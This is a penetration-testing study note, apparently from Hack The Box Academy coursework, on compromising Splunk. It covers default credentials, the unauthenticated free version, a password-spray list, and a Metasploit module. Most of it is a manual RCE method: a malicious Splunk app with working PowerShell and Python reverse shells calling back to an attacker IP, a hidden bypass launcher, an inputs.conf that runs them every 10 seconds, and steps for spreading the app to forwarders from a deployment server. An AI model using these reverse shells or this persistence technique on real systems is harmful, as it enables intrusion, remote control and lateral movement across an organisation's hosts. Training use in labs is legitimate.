### Footprinting + Enumeration
The Splunk web server runs by default on `port 8000`. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page.
![image](https://academy.hackthebox.com/storage/modules/113/changme.png)

**The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication**. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. **This will automatically convert to the free version that does not have any form of authentication**, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.
![](https://academy.hackthebox.com/storage/modules/113/splunk_home.png)
### Exploitation
#### Password Spraying
```bash
changeme
admin
Welcome
Welcome1
Password123
```

#### RCE
###### Metasploit
```bash
use exploit/multi/http/splunk_upload_app_exec
```
###### Manual
Create malicious app - Folder Structure
```bash
adot8@htb[/htb$ tree splunk_shell/

splunk_shell/
├── bin
└── default
```
The **bin** directory will contain the reverse shell/scripts we want to run. The **defaults** directory will host our `inputs.conf file`

Make `run.ps1` (Windows)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

```

Make `rev.py` (Linux)
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')

```

Make `run.bat` to call r`ev.ps1`
```powershell
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

Create tarball or `.spl`
```shell
tar -cvzf updater.tar.gz splunk_shell/
```

Setup listener

`Apps` -> `Manage Apps` -> `Install app from file` -> `Upload`

> [!NOTE] Note
>  If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

